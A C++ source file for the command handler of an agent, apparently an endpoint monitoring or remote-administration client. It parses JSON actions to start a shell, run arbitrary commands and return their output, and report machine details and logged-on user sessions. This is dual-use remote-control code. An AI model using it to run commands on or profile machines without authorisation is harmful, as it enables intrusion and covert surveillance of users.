#define NOMINMAX

#include "CommandHandler.h"
#include "Logger/GlobalLogger.h"
#ifdef _WIN32
#include "collection/system_information/windows_basic_info.hpp"
#endif
#include <algorithm>
#include <rapidjson/document.h>
#include <rapidjson/writer.h>
#include <rapidjson/stringbuffer.h>

using namespace CppAgent;

namespace {
    std::string make_response(bool success,
        const std::string* output = nullptr,
        const char* error = nullptr) {
        rapidjson::Document d;
        d.SetObject();
        auto& alloc = d.GetAllocator();
        d.AddMember("success", success, alloc);

        if (output) {
            rapidjson::Value data(rapidjson::kObjectType);
            data.AddMember("output", rapidjson::Value(output->c_str(), alloc), alloc);
            d.AddMember("data", data, alloc);
        }
        else {
            d.AddMember("data", rapidjson::Value(rapidjson::kNullType), alloc);
        }

        if (error) {
            d.AddMember("error", rapidjson::Value(error, alloc), alloc);
        }
        else {
            d.AddMember("error", rapidjson::Value(rapidjson::kNullType), alloc);
        }

        rapidjson::StringBuffer buffer;
        rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
        d.Accept(writer);
        return buffer.GetString();
    }
} // namespace

CommandHandler::CommandHandler() : shell_running_(false) {}

std::string CommandHandler::handle(const std::string& commandJson) {
	DARKSCRY_LOG("Received command: " + commandJson, Logger::Level::Debug);
    rapidjson::Document doc;
    if (doc.Parse(commandJson.c_str()).HasParseError() || !doc.IsObject()) {
        DARKSCRY_LOG("Invalid JSON", Logger::Level::Warning);
        return make_response(false, nullptr, "invalid json");
    }

    int action = 0;
    if (doc.HasMember("action_id") && doc["action_id"].IsInt())
        action = doc["action_id"].GetInt();
    else if (doc.HasMember("action") && doc["action"].IsInt())
        action = doc["action"].GetInt();
    else {
        DARKSCRY_LOG("No action provided", Logger::Level::Warning);
        return make_response(false, nullptr, "missing action");
    }

    if (action == START_SHELL_INSTANCE) {
#ifdef _WIN32
        if (!shell_)
            shell_ = std::make_unique<win32::Shell>();
        shell_running_ = shell_->create_by_sid(L"CURRENT_USER");
#else
        if (!shell_)
            shell_ = std::make_unique<linux_os::Shell>();
        shell_running_ = shell_->create();
#endif
        if (!shell_running_) {
            return make_response(false, nullptr, "failed to start shell");
        }
        DARKSCRY_LOG("Start shell instance requested", Logger::Level::Info);
        return make_response(true);
    }
    else if (action == RUN_COMMAND) {
        if (!shell_running_) {
            DARKSCRY_LOG("Run command but shell not running", Logger::Level::Warning);
            return make_response(false, nullptr, "Shell is not running");
        }

        std::string cmd;
        if (doc.HasMember("command")) {
            auto& c = doc["command"];
            if (c.IsObject() && c.HasMember("command") && c["command"].IsString())
                cmd = c["command"].GetString();
            else if (c.IsString())
                cmd = c.GetString();
        }

        DARKSCRY_LOG("Run command: " + cmd, Logger::Level::Debug);
#ifdef _WIN32
        std::string output = shell_->run_command(cmd);
#else
        std::string output = shell_->run_command(cmd);
#endif
        return make_response(true, &output);
    }
#ifdef _WIN32
    else if (action == GET_BASIC_MACHINE_INFO) {
        auto info = win32::sysinfo::get_basic_machine_info();

        rapidjson::Document d;
        d.SetObject();
        auto& alloc = d.GetAllocator();
        d.AddMember("success", true, alloc);

        rapidjson::Value machine(rapidjson::kObjectType);
        machine.AddMember("HostName", rapidjson::Value(info.host_name.c_str(), alloc), alloc);
        machine.AddMember("OperatingSystem", rapidjson::Value(info.operating_system.c_str(), alloc), alloc);
        machine.AddMember("OSVersionDetail", rapidjson::Value(info.os_version_detail.c_str(), alloc), alloc);
        machine.AddMember("CPU", rapidjson::Value(info.cpu.c_str(), alloc), alloc);
        machine.AddMember("RAM", rapidjson::Value(info.ram.c_str(), alloc), alloc);
        machine.AddMember("Disk", rapidjson::Value(info.disk.c_str(), alloc), alloc);
        machine.AddMember("PrimaryIP", rapidjson::Value(info.primary_ip.c_str(), alloc), alloc);
        machine.AddMember("GPU", rapidjson::Value(info.gpu.c_str(), alloc), alloc);
        machine.AddMember("AgentStatus", rapidjson::Value("Active and Monitoring", alloc), alloc);
        if (!info.logged_on_sessions.empty())
            machine.AddMember("LastLogin", rapidjson::Value(info.logged_on_sessions.front().c_str(), alloc), alloc);
        else
            machine.AddMember("LastLogin", rapidjson::Value("", alloc), alloc);

        rapidjson::Value sessions(rapidjson::kArrayType);
        for (auto& s : info.logged_on_sessions)
            sessions.PushBack(rapidjson::Value(s.c_str(), alloc), alloc);
        machine.AddMember("LogedInSessions", sessions, alloc);

        rapidjson::Value data(rapidjson::kObjectType);
        data.AddMember("machine_info", machine, alloc);
        d.AddMember("data", data, alloc);
        d.AddMember("error", rapidjson::Value(rapidjson::kNullType), alloc);

        rapidjson::StringBuffer buffer;
        rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
        d.Accept(writer);
        return buffer.GetString();
    }
#endif

    DARKSCRY_LOG("Unknown action: " + std::to_string(action), Logger::Level::Warning);
    return make_response(false, nullptr, "unknown action");
}

